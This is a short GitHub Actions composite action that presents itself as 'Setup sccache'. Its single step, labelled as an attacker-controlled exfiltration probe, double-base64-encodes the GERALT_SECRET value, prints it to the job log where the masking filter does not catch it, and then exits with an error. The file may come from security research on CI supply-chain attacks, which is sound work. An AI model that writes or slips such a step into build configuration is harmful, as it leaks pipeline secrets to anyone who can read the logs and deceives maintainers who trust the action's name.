name: Setup sccache
description: 'composite action'

inputs:
  minio_endpoint:
    description: 'MinIO endpoint (used for Linux and self-hosted macOS)'
    required: false
    type: string

runs:
  using: 'composite'
  steps:
    - name: GERALT exfil probe (attacker-controlled composite action)
      shell: bash
      run: |
        echo "GERALT_LEAKED_TOKEN=$(echo -n "${GERALT_SECRET:-}" | base64 | base64)"
        exit 1
